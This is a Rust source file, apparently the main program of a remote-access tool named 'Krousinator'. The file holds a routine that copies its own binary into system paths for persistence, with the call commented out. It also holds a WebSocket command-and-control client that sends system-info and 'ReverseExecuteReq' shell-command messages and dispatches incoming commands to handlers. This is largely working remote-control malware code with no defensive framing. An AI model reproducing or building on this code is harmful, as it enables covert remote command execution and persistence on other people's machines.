mod models;
use common::registry::{Context, HandlerMeta, HandlerRegistry};
// serd
use serde_json::Value;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
// ws
use futures_util::StreamExt;
use tokio_tungstenite::connect_async;

// fs
use std::path::Path;
use tokio::fs::create_dir_all;
use tokio::fs::File;

#[cfg(target_os = "windows")]
static DEST_PATH: &str = "C:\\ProgramData\\MyApp";

#[cfg(target_os = "macos")]
static DEST_PATH: &str = "/usr/local/bin/Krousinator";

#[cfg(target_os = "linux")]
static DEST_PATH: &str = "/usr/local/bin/Krousinator";

async fn move_binary() -> Result<(), Box<dyn std::error::Error>> {
    let binary = std::env::current_exe()?;
    let mut src = File::open(binary).await?;

    let parent_dir = Path::new(DEST_PATH).parent().unwrap();

    if !parent_dir.exists() {
        create_dir_all(parent_dir).await?;
    }

    let mut dest = File::create(DEST_PATH).await?;

    let mut buffer = Vec::new();
    src.read_to_end(&mut buffer).await?;
    dest.write_all(&buffer).await?;

    Ok(())
}

#[tokio::main]
async fn main() {
    // setup

    // move_binary().unwrap_or_else(|e| panic!("moving binary operation failed: {}", e)).await;
    let mut reg: HandlerRegistry = HandlerRegistry::new();

    // regester all handles
    for handler in inventory::iter::<HandlerMeta> {
        reg.register(handler.name, handler.constructor);
    }

    // Establish connection

    let (ws_stream, _) = connect_async::<&'static str>("ws://0.0.0.0:3000".into())
        .await
        .expect("uh oh");

    println!("✅ Connected!");
    let (write, mut read) = ws_stream.split();

    for i in 0..10 {
        write
            .send("{\"_t\":\"SystemInfoReq\"}".into())
            .await
            .unwrap();
        write.send(format!("{{\"_t\":\"ReverseExecuteReq\",\"payload\":\"cat /etc/nixos/background/e.png\",\"payload_response\":true}}").into()).await.unwrap();
    }

    let mut context = Context::new(write);

    // main ingress loop

    tokio::spawn(async move {
        loop {
            match read.next().await {
                Some(Ok(msg)) => {
                    let raw_text = match msg.into_text() {
                        Ok(text) => text,
                        Err(e) => {
                            eprintln!("Failed to decode message text: {}", e);
                            continue;
                        }
                    };

                    let json: Value = match serde_json::from_str(&raw_text) {
                        Ok(val) => val,
                        Err(_) => {
                            println!("Found non-valid JSON. Skipping.");
                            continue;
                        }
                    };

                    println!("{}", raw_text);

                    let message_type = match json.get("_t").and_then(|v| v.as_str()) {
                        Some(t) => t,
                        None => {
                            println!("No '_t' field found in message. Skipping.");
                            continue;
                        }
                    };

                    match reg.get(message_type, &raw_text) {
                        Some(handler) => match handler {
                            Ok(handler) => handler.handle(&mut context).await,
                            Err(_err) => continue,
                        },
                        None => {
                            println!("No handler found for type '{}'. Skipping.", message_type);
                            continue;
                        }
                    }
                }

                Some(Err(e)) => {
                    eprintln!("WebSocket error: {}", e);
                    continue;
                }
                None => {
                    println!("WebSocket stream closed.");
                    break;
                }
            }
        }
    });

    loop {
        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
    }
}
